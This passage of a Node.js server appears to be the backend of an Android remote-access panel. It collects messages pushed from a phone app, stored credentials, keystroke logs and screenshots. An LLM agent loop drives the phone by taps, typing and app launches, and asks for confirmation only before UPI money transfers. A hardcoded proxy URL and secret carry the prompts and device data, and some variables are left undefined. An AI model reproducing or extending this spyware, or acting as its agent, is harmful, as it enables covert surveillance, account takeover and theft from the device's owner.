  if (!db.inbox[did]) db.inbox[did] = [];
  return db.inbox[did];
}

// Panel: list messages
app.get('/api/devices/:deviceId/inbox', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const list = inboxFor(did);
  const unread = list.reduce((n, m) => n + (m.read ? 0 : 1), 0);
  res.json({ messages: list, unread, total: list.length });
});

// Panel: mark all (or specific ids) as read
app.post('/api/devices/:deviceId/inbox/read', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const list = inboxFor(did);
  let n = 0;
  list.forEach(m => {
    if (!m.read && (!ids || ids.includes(m.id))) { m.read = true; n++; }
  });
  if (n) dbSave();
  res.json({ ok: true, updated: n });
});

// Panel: delete one or all
app.delete('/api/devices/:deviceId/inbox/:msgId', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const mid = req.params.msgId;
  const db = dbLoad();
  const before = (db.inbox[did] || []).length;
  db.inbox[did] = (db.inbox[did] || []).filter(m => m.id !== mid);
  if (db.inbox[did].length !== before) dbSave();
  res.json({ ok: true, removed: before - db.inbox[did].length });
});

app.delete('/api/devices/:deviceId/inbox', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const db = dbLoad();
  db.inbox[did] = [];
  dbSave();
  res.json({ ok: true });
});

// APK push (no session — auth via deviceToken in query)
// Body may be a single { from, body, ts? } or { messages: [ ... ] }
app.post('/device/inbox', (req, res) => {
  const tok = String(req.query.token || '').trim();
  const did = String(req.query.deviceId || '').trim();
  if (!tok || !did) return res.status(400).json({ error: 'missing token/deviceId' });
  const data = dbLoad();
  const user = data.users.find(u => u.deviceToken === tok);
  if (!user || user.banned) return res.status(401).json({ error: 'unauthorized' });

  const incoming = Array.isArray(req.body?.messages)
    ? req.body.messages
    : [req.body || {}];
  const list = inboxFor(did);
  let added = 0;
  for (const m of incoming) {
    const from = String(m.from || '').slice(0, 80);
    const body = String(m.body || '').slice(0, 4000);
    if (!from && !body) continue;
    list.push({
      id: uid(8),
      ts: Number(m.ts) > 0 ? Number(m.ts) : now(),
      from: from || 'Unknown',
      body,
      read: false,
    });
    added++;
  }
  // Cap
  if (list.length > INBOX_MAX) list.splice(0, list.length - INBOX_MAX);
  if (added) dbSave();
  res.json({ ok: true, added });
});


// =================== AI AGENT ===================
const agentChats   = {}; // did -> [{role, content, ts}]
const agentPending = {}; // did -> {actions, confirmMessage}

function getAiConfig() {
  const d = dbLoad();
  return d.aiConfig || { openaiKey: '', model: 'gpt-4o-mini' };
}

app.get('/api/ai-config', authAdmin, (req, res) => {
  const cfg = getAiConfig();
  res.json({ model: cfg.model || 'gpt-4o-mini', hasKey: !!cfg.openaiKey });
});

app.put('/api/ai-config', authAdmin, (req, res) => {
  const { openaiKey, model } = req.body || {};
  const d = dbLoad();
  d.aiConfig = { openaiKey: String(openaiKey || '').trim(), model: String(model || 'gpt-4o-mini').trim() };
  dbSave(d);
  res.json({ ok: true });
});

app.post('/api/devices/:deviceId/agent/activate', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const on = (req.body && req.body.on !== false); // default on
  if (on) {
    agentStreaming[did] = Date.now() + 90000; // 90 second TTL
  } else {
    delete agentStreaming[did];
  }
  res.json({ ok: true, agentStreaming: !!on });
});

app.get('/api/devices/:deviceId/agent/creds', authSession, authDeviceAccess, (req, res) => {
  const d = dbLoad();
  const dev = d.devices[req.params.deviceId];
  res.json({ creds: dev?.agentCreds || {} });
});

app.put('/api/devices/:deviceId/agent/creds', authSession, authDeviceAccess, (req, res) => {
  const { creds } = req.body || {};
  const d = dbLoad();
  if (!d.devices[req.params.deviceId]) return res.status(404).json({ error: 'device not found' });
  d.devices[req.params.deviceId].agentCreds = creds || {};
  dbSave(d);
  res.json({ ok: true });
});

app.get('/api/devices/:deviceId/agent/chat', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const pending = agentPending[did] || null;
  res.json({
    messages: agentChats[did] || [],
    pendingConfirm: pending ? { confirmMessage: pending.confirmMessage } : null
  });
});

app.delete('/api/devices/:deviceId/agent/chat', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  agentChats[did] = [];
  delete agentPending[did];
  res.json({ ok: true });
});

app.post('/api/devices/:deviceId/agent/confirm', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const confirmed = !!(req.body && req.body.confirmed);
  const pending = agentPending[did];
  delete agentPending[did];
  const chat = agentChats[did] || (agentChats[did] = []);
  if (!pending) return res.json({ ok: true, queued: 0 });
  if (confirmed) {
    const cmds = commands[did] || (commands[did] = []);
    let queued = 0;
    const TYPE_NORM = {'type':'text','press_home':'home','press_back':'back','click':'tap','input':'text'};
    for (const a of (pending.actions || [])) {
      const t = TYPE_NORM[a.type] || a.type;
      cmds.push({ id: crypto.randomBytes(8).toString('hex'), type: t, params: a.params || {}, ts: now() });
      queued++;
    }
    chat.push({ role: 'system_note', content: `✅ Admin confirmed — ${queued} action(s) queued.`, ts: now() });
    res.json({ ok: true, queued });
  } else {
    chat.push({ role: 'system_note', content: '❌ Admin rejected the action.', ts: now() });
    res.json({ ok: true, queued: 0 });
  }
});

app.post('/api/devices/:deviceId/agent/chat', authSession, authDeviceAccess, async (req, res) => {
  const did = req.params.deviceId;
  const message = String((req.body || {}).message || '').trim();
  if (!message) return res.status(400).json({ error: 'message required' });
  const cfg = getAiConfig();
  // No API key needed — using Replit AI proxy
  const d = dbLoad();
  const dev = d.devices[did];
  if (!dev) return res.status(404).json({ error: 'device not found' });
  const creds = dev.agentCreds || {};
  const tree  = nodeTree[did];
  const kl    = (keyLogs[did] || []).slice(-8);
  const credsText = Object.entries(creds).filter(([,v]) => v).map(([k,v]) => `${k}: ${v}`).join(', ') || 'none stored';
  let nodesText = 'No screen data available';
  if (tree && tree.nodes && tree.nodes.length) {
    const lines = [];
    for (const n of tree.nodes.slice(0, 80)) {
      const [l,t,r,b] = n.b || [0,0,0,0];
      if ((r-l) < 10 || (b-t) < 10) continue;
      const cx = Math.round((l+r)/2), cy = Math.round((t+b)/2);
      const flags = [];
      if (n.k & 1) flags.push('tap'); if (n.k & 2) flags.push('input'); if (n.k & 8) flags.push('focused');
      lines.push(`[${flags.join(',')||'view'}] "${(n.t||'').slice(0,60)}" @(${cx},${cy})`);
    }
    nodesText = lines.join('\n') || 'Screen visible but no nodes';
  }
  const keylogText = kl.map(k=>`${k.app||'?'}: "${(k.text||k.added||'').slice(0,30)}"`).join(' | ') || 'none';
  // Get screenshot as base64 for vision
  const shotBuf = screenshots[did]?.buf;
  // Build installed apps context for agent
  const apps = deviceApps[did] || [];
  const COMMON_APPS = [
    'WhatsApp (com.whatsapp)', 'WhatsApp Business (com.whatsapp.w4b)', 'Telegram (org.telegram.messenger)', 'Instagram (com.instagram.android)',
    'YouTube (com.google.android.youtube)', 'Chrome (com.android.chrome)', 'Gmail (com.google.android.gm)',
    'Google Maps (com.google.android.apps.maps)', 'PhonePe (com.phonepe.app)', 'Google Pay (com.google.android.apps.nbu.paisa.user)',
    'Paytm (net.one97.paytm)', 'Amazon (in.amazon.mShoppingAndroid)', 'Flipkart (com.flipkart.android)',
    'Facebook (com.facebook.katana)', 'Twitter/X (com.twitter.android)', 'Snapchat (com.snapchat.android)',
    'Spotify (com.spotify.music)', 'Netflix (com.netflix.mediaclient)', 'Hotstar (in.startv.hotstar)',
    'Zomato (com.application.zomato)', 'Swiggy (in.swiggy.android)', 'Ola (com.olacabs.customer)',
    'Uber (com.ubercab)', 'MakeMyTrip (com.makemytrip)', 'IRCTC (cris.org.in.prs.ima)',
    'Google (com.google.android.googlequicksearchbox)', 'Play Store (com.android.vending)',
    'Settings (com.android.settings)', 'Calculator (com.android.calculator2)',
    'Camera (com.android.camera)', 'Gallery (com.android.gallery3d)',
    'Phone (com.android.dialer)', 'Contacts (com.android.contacts)',
    'Messages (com.android.mms)', 'Files (com.android.documentsui)',
    'Clock (com.android.deskclock)', 'Calendar (com.android.calendar)',
  ];
  const appsText = apps.length > 0
    ? apps.map(a => `${a.name} (${a.pkg})`).join(', ')
    : '(Device app list pending — use these known package names: ' + COMMON_APPS.join(', ') + ')';

  const sysPrompt = `You are an autonomous Android remote-control AI agent with full accessibility access and computer vision.
You control a REAL physical phone. You work autonomously — after each response the system will re-run you with an updated screenshot until done=true.

DEVICE: ${dev.brand||'?'} ${dev.model||'?'}  Android ${dev.androidVersion||'?'}  Screen: ${tree?.screenW||'?'}x${tree?.screenH||'?'}
STORED CREDENTIALS: ${credsText}
RECENT KEYSTROKES: ${keylogText}
INSTALLED USER APPS: ${appsText}

SCREEN NODES (accessibility tree — use coordinates from these for precise taps):
${nodesText}
${imageBase64 ? '[LIVE SCREENSHOT ATTACHED — read every word, button, and UI element carefully]' : '[No screenshot — use node tree only]'}

AVAILABLE ACTIONS:
  tap         {"type":"tap","params":{"x":540,"y":1200}}           ← tap UI element at center coordinates
  long_press  {"type":"long_press","params":{"x":540,"y":1200}}    ← hold for 800ms (context menus, selections)
  swipe       {"type":"swipe","params":{"x1":540,"y1":1600,"x2":540,"y2":400,"dur":400}}
  scroll      {"type":"scroll","params":{"x1":540,"y1":1400,"x2":540,"y2":600,"dur":300}}
  text        {"type":"text","params":{"text":"Hello"}}             ← types into focused field
  clear       {"type":"clear","params":{}}                          ← clears focused field
  enter       {"type":"enter","params":{}}                          ← press Enter/Send
  back        {"type":"back","params":{}}
  home        {"type":"home","params":{}}
  recents     {"type":"recents","params":{}}
  launch      {"type":"launch","params":{"package":"com.whatsapp"}}

VISION RULES:
- Read the screenshot FIRST. Identify the current app, screen title, and all visible elements.
- Read every text label, button, hint visible. Match them to node tree entries.
- For TAP: use the CENTER of the node bounds rectangle. bounds=[left,top,right,bottom] → x=(left+right)/2, y=(top+bottom)/2.
- For elements NOT in the node tree: estimate position from screenshot. Screen is ${tree?.screenW||1080}x${tree?.screenH||2412}.
- After each action batch executes, you will receive a FRESH screenshot — verify the result then.
- If the screen did NOT change after your action, the coordinates were wrong or the element was not tappable — try a different approach.

WORKFLOW RULES:
- OPEN APP: use launch with exact package name from INSTALLED USER APPS list.
- SCROLL DOWN: {"type":"scroll","params":{"x1":540,"y1":1800,"x2":540,"y2":600,"dur":500}} (y1 > y2)
- SCROLL UP:   {"type":"scroll","params":{"x1":540,"y1":600,"x2":540,"y2":1800,"dur":500}} (y1 < y2)
- SWIPE LEFT:  {"type":"swipe","params":{"x1":900,"y1":1200,"x2":100,"y2":1200,"dur":300}}
- SWIPE RIGHT: {"type":"swipe","params":{"x1":100,"y1":1200,"x2":900,"y2":1200,"dur":300}}
- TYPE TEXT: FIRST tap the text field → THEN send text action. Always two separate actions.
- SEND MESSAGE: after typing, tap the Send button or use enter action.
- ONE action per step when precision matters (e.g. tapping specific elements). Up to 3 for simple sequences.
- NEVER go home unless explicitly asked. Stay in the current app and navigate within it.
- done=true ONLY when you can SEE the final result in the screenshot (message sent, app open, task complete).
- done=false while in progress — the system will call you again with fresh screenshot automatically.

CONFIRMATION RULE:
- ONLY ask confirmRequired=true for UPI money transfers. Set confirmMessage = "Sending ₹AMOUNT to NAME (upi@id). Confirm?"
- For everything else (opening apps, sending messages, searches, scrolling, etc.): confirmRequired=false, just do it.
- NEVER ask for confirmation to open apps, type text, or navigate.

REPLY FORMAT — raw JSON only, NO markdown, NO code fences, NO backticks:
{"thinking":"step-by-step analysis of what I see and what actions to take","reply":"brief status for admin","actions":[...],"confirmRequired":false,"confirmMessage":"","done":false}

ACCURACY RULES:
1. thinking, reply, confirmMessage must be plain strings (no nested JSON, no quotes inside).
2. actions array must contain real action objects with correct x/y from node tree.
3. Return valid JSON — no trailing commas, no extra keys.
4. done=true ONLY when you can VISUALLY CONFIRM the task is complete from the screenshot.
   - After "launch", wait for the NEXT screenshot to confirm the app opened.
   - If the screen looks the same after sending actions, something went wrong — try differently.
   - NEVER set done=true immediately after sending a launch action.
5. If an app launch fails (screen unchanged), try: recents → find the app, or home → swipe up app drawer → tap icon.
6. Use exact pixel coordinates from the node tree for ALL taps. Read the node bounds carefully.
7. For text input: first confirm the field is focused (keyboard visible in screenshot), then type.`;
  const chat = agentChats[did] || (agentChats[did] = []);
  chat.push({ role: 'user', content: message, ts: now() });

  const PROXY_URL = 'https://9fd87837-a905-4115-8849-19bad1962cf8-00-1usl2s1kehzec.riker.replit.dev/api/ai/agent';
  const TYPE_MAP = { 'type': 'text', 'press_home': 'home', 'press_back': 'back', 'press_recents': 'recents', 'click': 'tap', 'input': 'text', 'open_app': 'launch', 'long_click': 'long_press', 'fling': 'scroll' };

  function enqueueActions(did, acts) {
    const cmds = commands[did] || (commands[did] = []);
    for (const a of acts) {
      const t = TYPE_MAP[a.type] || a.type;
      cmds.push({ id: crypto.randomBytes(8).toString('hex'), type: t, params: a.params || {}, ts: now() });
    }
  }

  async function callAI(sysPrompt, history, imageBase64) {
    const proxyRes = await fetch(PROXY_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-agent-secret': 'bcbd3be965ced03614f8e5a215b5390279693047959f069a' },
      body: JSON.stringify({ systemPrompt: sysPrompt, messages: history, imageBase64 }),
      signal: AbortSignal.timeout(40000),
    });
    const proxyData = await proxyRes.json();
    if (proxyData.error) throw new Error(proxyData.error);
    // Robust JSON extraction from response
    let raw = (proxyData.content || proxyData.thinking || '').replace(/^```[a-z]*\n?|\n?```$/gm,'').trim();
    if (!raw.startsWith('{')) {
      const m = raw.match(/\{[\s\S]*\}/);
      raw = m ? m[0] : raw;
    }
    let parsed;
    try { parsed = JSON.parse(raw); }
    catch { parsed = { thinking: proxyData.thinking||'', reply: raw.slice(0, 300), actions: [], confirmRequired: false, done: false }; }
    return {
      reply: String(parsed.reply || 'Done.'),
      thinking: String(parsed.thinking || proxyData.thinking || ''),
      actions: Array.isArray(parsed.actions) ? parsed.actions.slice(0, 8) : [],
      confirmRequired: !!parsed.confirmRequired,
      confirmMessage: String(parsed.confirmMessage || ''),
      done: !!parsed.done,
    };
  }

  // ── AGENTIC LOOP (up to 4 auto-steps)
  const MAX_STEPS = 4;
  let loopReply = '', loopThinking = '', loopConfirmRequired = false, loopConfirmMessage = '', loopDone = false;
  let totalActions = 0;

  for (let step = 0; step < MAX_STEPS; step++) {
    const history = chat.filter(m => m.role==='user'||m.role==='assistant').slice(-20).map(m=>({role:m.role,content:m.content}));

    let result;
    try {
      result = await callAI(sysPrompt, history, imageBase64);
    } catch (err) {
      loopReply = 'Error: ' + (err.message || 'AI call failed.');
      break;
    }

    loopReply = result.reply;
    loopThinking = result.thinking;
    loopConfirmRequired = result.confirmRequired;
    loopConfirmMessage = result.confirmMessage;
    loopDone = result.done;

    chat.push({ role: 'assistant', content: loopReply, ts: now() });
    while (chat.length > 200) chat.shift();

    if (result.confirmRequired && result.actions.length > 0) {
      agentPending[did] = { actions: result.actions, confirmMessage: result.confirmMessage };
      break;
    }

    if (result.actions.length > 0) {
      enqueueActions(did, result.actions);
      totalActions += result.actions.length;
    }

    // Stop loop if done or no actions
    if (result.done || result.actions.length === 0) break;

    // Wait for device to pick up and execute commands, then loop with fresh screenshot
    if (step < MAX_STEPS - 1) {
      // Wait for cmds to drain (device heartbeats every 1s)
      const drainStart = Date.now();
      while ((commands[did]||[]).length > 0 && Date.now() - drainStart < 6000) {
        await new Promise(r => setTimeout(r, 300));
      }
      // Check if any action was a launch (app open) — those need 3s for the app to appear
      const hasLaunch = result.actions.some(a => (a.type||'') === 'launch' || (a.type||'') === 'open_app');
      // Extra wait for UI transitions/animations — 1.5s per action, min 2s, max 5s
      const execWait = hasLaunch ? 3500 : Math.max(2000, Math.min(result.actions.length * 1200, 5000));
      await new Promise(r => setTimeout(r, execWait));
      // Add continuation context
      chat.push({ role: 'user', content: `[Step ${step+1} executed (${result.actions.length} action(s)). Fresh screenshot attached. Verify the result — did the action work? If yes, continue. If nothing changed, try a different approach.]`, ts: now() });
    }
  }

  res.json({ ok: true, reply: loopReply, thinking: loopThinking, confirmRequired: loopConfirmRequired, confirmMessage: loopConfirmMessage, done: loopDone, actionsCount: totalActions });
});

// =================== STATIC SPA ===================
app.use('/api', (req, res) => res.status(404).json({ error: 'not found' }));
app.use(express.static(DIST, { maxAge: '1h', etag: true, index: false }));
app.use((req, res) => {
  if (fs.existsSync(INDEX)) {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    res.sendFile(INDEX);
  } else res.status(503).send('SPA not built');
});


app.listen(PORT, '0.0.0.0', () => {
  console.log(`AK Panel API + SPA on :${PORT}  (hb=${HB_INTERVAL_MS}ms ttl=${ONLINE_TTL_MS}ms)`);
});
